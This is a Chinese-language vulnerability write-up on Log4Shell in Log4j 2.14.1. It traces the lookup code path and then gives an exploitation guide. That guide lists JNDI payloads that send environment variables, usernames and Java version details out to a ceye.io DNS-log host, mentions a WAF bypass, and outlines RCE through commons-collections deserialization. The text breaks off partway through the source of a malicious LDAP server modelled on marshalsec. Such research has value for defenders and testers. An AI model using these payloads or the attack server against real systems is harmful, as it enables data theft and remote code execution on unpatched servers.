**作者：lxraa  
本文为作者投稿，Seebug Paper 期待你的分享，凡经采用即有礼品相送！ 投稿邮箱：PI:EMAIL**
# 一、漏洞分析
调试版本：2.14.1
### 1、漏洞触发点：
org.apache.logging.log4j.core.net.JndiManager:172
调用栈：
熟悉的lookup，因此log4shell如果要命令执行，需要利用jndi触发的反序列化漏洞，并不是单纯的rce，等价于：
    // name可控
    String name = "ldap://127.0.0.1:1333/#Exploit";
    Context ctx = new InitialContext();
    ctx.lookup(name);
### 2、代码分析
关键函数1：
org\apache\logging\log4j\core\lookup\StrSubstitutor.substitute
函数流程如下：
  * 找到String中的${}，将里面的变量拿出来解析
其中prefixMatcher是一个StringMatcher继承自虚类StrMatcher，用来匹配字符串，后面多处用到，他的关键函数定义及作用是
/**
看buffer的pos处是否为指定字符串(初始化时指定，如prefixMatcher的指定字符串为"${")，如果是则返回字符串长度，否则返回0；
**/
`public abstract int isMatch(char[] buffer, int pos, int bufferStart, int
bufferEnd);`
  * 987行到1029行会对`:-`和`：\-`进行处理，与漏洞主要逻辑无关，但该处可以用来绕过waf，详见漏洞利用
  * 1033行调用resolveVariable解析${}里弄出来的变量
关键函数2：
org\apache\logging\log4j\core\lookup\StrSubstitutor.resolveVariable
这个函数获取StrLookup对${}里的变量进行解析，StrLookup是个接口，Interpolator类间接实现了StrLookup:
    public class Interpolator extends AbstractConfigurationAwareLookup ...
    public abstract class AbstractConfigurationAwareLookup extends AbstractLookup implements ConfigurationAware ...
    public abstract class AbstractLookup implements StrLookup ...
它的lookup方法通过`:`前的PREFIX，从Interpolator的一个私有hashmap里决定分配给哪个具体的Lookup处理变量，所有支持的PREFIX有：
对应所有接口的实现在org\apache\logging\log4j\core\lookup\包：
  * 各StrLookup接口实现功能分析：
关键函数是`lookup(final LogEvent event,final String key);`
date：格式化时间：
java：输出本地java语言相关信息：
marker：从event的marker中获取信息，暂不清楚做什么用
ctx：从event的contextData(一个map)中取value
lower：取小写
upper：取大写
jndi：等价与
        // name可控
        String name = "xxx";
        Context ctx = new InitialContext();
        ctx.lookup(name);
main：从内存某个map里获取value
jvmrunargs：本意好像是从jvm参数中获取参数，调试中发现初始化的map和strLookupMap中的map不是同一个，原因未知
sys：等价于`System.getProperty(xxx)`
env：等价于`System.env`获取环境变量，可以如下图所示列出本地所有的环境变量
log4j：支持configLocation和configParentLocation两个key，当存在log4j2.xml配置文件时，可以获取该文件的绝对路径，和上级文件夹的绝对路径
# 二、漏洞利用
### 1、漏洞探测
常规方法，可以利用dns log探测漏洞是否存在，例：利用ceye探测漏洞是否存在：
    logger.error("${jndi:ldap://****.ceye.io/}");
### 2、信息收集
利用sys、env等lookup+dnslog，进行利用环境的信息收集（由于域名中不能存在某些特殊字符，因此不是所有的环境变量都可以利用dnslog带出来），以下是部分windows下利用的payload：
    logger.error("${jndi:ldap://${env:OS}.vwva2y.ceye.io/}"); //系统版本
    logger.error("${jndi:ldap://${env:USERNAME}.vwva2y.ceye.io/}");//用户名
    logger.error("${jndi:ldap://${sys:java.version}.vwva2y.ceye.io/}");//java版本，这个比较关键，因为jndi注入的payload高度依赖于java版本
    logger.error("${jndi:ldap://${sys:os.version}.vwva2y.ceye.io/}");//系统版本
    logger.error("${jndi:ldap://${sys:user.timezone}.vwva2y.ceye.io/}");//时区
    logger.error("${jndi:ldap://${sys:file.encoding}.vwva2y.ceye.io/}");//文件编码
    logger.error("${jndi:ldap://${sys:sun.cpu.endian}.vwva2y.ceye.io/}");//cpu大端or小端
    logger.error("${jndi:ldap://${sys:sun.desktop}.vwva2y.ceye.io/}");//系统版本
    logger.error("${jndi:ldap://${sys:sun.cpu.isalist}.vwva2y.ceye.io/}");//cpu指令集
### 3、RCE
log4shell的RCE基本等于jndi注入，log4shell可以探测jdk版本，可以根据实际环境选择适当的方法进行rce。jndi注入的利用姿势可以参考：
以下以1.8.0_261版本下的rce为例：
由于8u191+的jdk不再信任远程加载的类，本例使用ldap
entry的javaSerializedData属性的反序列化触发本地的Gadget，利用条件是工程有commons-collections依赖，版本需
 pp.txt
  * 构造恶意LDAP服务器，参考了marshalsec
      package com.lxraa.test.jndi;
      import java.io.FileInputStream;
      import java.io.IOException;
      import java.net.InetAddress;
      import java.net.URL;
      import javax.net.ServerSocketFactory;
      import javax.net.SocketFactory;
      import javax.net.ssl.SSLSocketFactory;
      import com.twitter.chill.Base64;
      import com.unboundid.ldap.listener.InMemoryDirectoryServer;
      import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
      import com.unboundid.ldap.listener.InMemoryListenerConfig;
      import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
      import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
      import com.unboundid.ldap.sdk.Entry;
      import com.unboundid.ldap.sdk.LDAPException;
      import com.unboundid.ldap.sdk.LDAPResult;
      import com.unboundid.ldap.sdk.ResultCode;
      public class LDAPServer {
          private static final String LDAP_BASE = "dc=example,dc=com";
          public static void main (String[] args) {
              int port = 1333;
              String url = "http://127.0.0.1:3000/#Exploit";
              try {
                  InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
                  config.setListenerConfigs(new InMemoryListenerConfig(
                          "listen", //$NON-NLS-1$
                          InetAddress.getByName("0.0.0.0"), //$NON-NLS-1$
                          port,
                          ServerSocketFactory.getDefault(),
                          SocketFactory.getDefault(),
                          (SSLSocketFactory) SSLSocketFactory.getDefault()));
                  config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(url)));
                  InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
                  System.out.println("Listening on 0.0.0.0:" + port); //$NON-NLS-1$
                  ds.startListening();
              }
              catch ( Exception e ) {
                  e.printStackTrace();
              }
          }
          private static class OperationInterceptor extends InMemoryOperationInterceptor {